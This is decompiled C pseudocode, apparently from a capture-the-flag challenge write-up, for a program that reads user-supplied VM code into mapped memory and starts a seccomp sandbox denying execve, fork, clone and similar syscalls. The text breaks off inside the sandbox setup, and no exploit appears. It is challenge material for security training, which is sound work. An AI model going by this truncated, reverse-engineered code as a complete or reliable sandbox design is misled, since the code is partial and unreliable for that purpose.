<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> a2<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-7Ch]</span>
  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-78h]</span>
  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-74h]</span>
  Virtual_machine v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-70h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-8h]</span>

  v14 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>off_4E4958<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>off_4E4950<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>off_4E4948<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">init_memory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v13<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read_data_to_memory</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v13<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"VM code received:\n-------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v11 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    v12 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> v10 <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        v9 <span class="token operator">=</span> v11<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%03u: "</span><span class="token punctuation">,</span> v9<span class="token punctuation">,</span> v11<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13<span class="token punctuation">.</span>input_data_addr <span class="token operator">+</span> v10<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
        v12 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13<span class="token punctuation">.</span>input_data_addr <span class="token operator">+</span> v10<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13<span class="token punctuation">.</span>input_data_addr <span class="token operator">+</span> v10<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\n-------------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">init_sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"sandbox failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
      <span class="token function">start_vm</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v13<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

__int64 __fastcall <span class="token function">init_memory</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h]</span>

  v2 <span class="token operator">=</span> <span class="token function">mmap64</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">4096LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">34LL</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">mmap64</span><span class="token punctuation">(</span><span class="token number">539230208LL</span><span class="token punctuation">,</span> <span class="token number">12288LL</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">,</span> <span class="token number">34LL</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_memset_ifunc</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>
  a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">j_memset_ifunc</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">4096LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">j_memset_ifunc</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">12288LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

__int64 __fastcall <span class="token function">read_data_to_memory</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">,</span> <span class="token keyword">int</span> a5<span class="token punctuation">,</span> <span class="token keyword">int</span> a6<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> __int64 i<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h]</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"Please input your code (max: %d), end with EOF:\n"</span><span class="token punctuation">,</span> <span class="token number">4096</span><span class="token punctuation">,</span> a3<span class="token punctuation">,</span> a4<span class="token punctuation">,</span> a5<span class="token punctuation">,</span> a6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> i <span class="token operator">+=</span> v8 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Damn, too large!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    v8 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a2 <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v8 <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hold on, no code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">init_sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v31<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v32<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v33<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v34<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">char</span> v35<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v36<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v37<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v38<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v39<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v40<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v41<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v42<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v43<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v44<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v45<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v46<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v47<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v48<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v49<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v50<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">char</span> v51<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h]</span>
  <span class="token keyword">int</span> v52<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-2Ch]</span>
  __int64 v53<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v54<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v55<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v56<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v57<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v58<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v59<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v60<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v61<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v62<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v63<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v64<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v65<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v66<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v67<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">int</span> v68<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>
  __int64 v69<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>

  v52 <span class="token operator">=</span> <span class="token function">open64</span><span class="token punctuation">(</span><span class="token string">"/dev/null"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v35<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v52 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">madvise_1</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v52<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v52<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v53 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">2147418112LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v53 <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v53<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v36<span class="token punctuation">,</span> v53<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v54<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">322</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v37<span class="token punctuation">,</span> v54<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v55<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v38<span class="token punctuation">,</span> v55<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v56<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v7<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v39<span class="token punctuation">,</span> v56<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v57<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">435</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v9<span class="token punctuation">,</span> v10<span class="token punctuation">,</span> v40<span class="token punctuation">,</span> v57<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v58<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v11<span class="token punctuation">,</span> v12<span class="token punctuation">,</span> v41<span class="token punctuation">,</span> v58<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v59<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v13<span class="token punctuation">,</span> v14<span class="token punctuation">,</span> v42<span class="token punctuation">,</span> v59<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v60<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v15<span class="token punctuation">,</span> v16<span class="token punctuation">,</span> v43<span class="token punctuation">,</span> v60<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v61<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v17<span class="token punctuation">,</span> v18<span class="token punctuation">,</span> v44<span class="token punctuation">,</span> v61<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
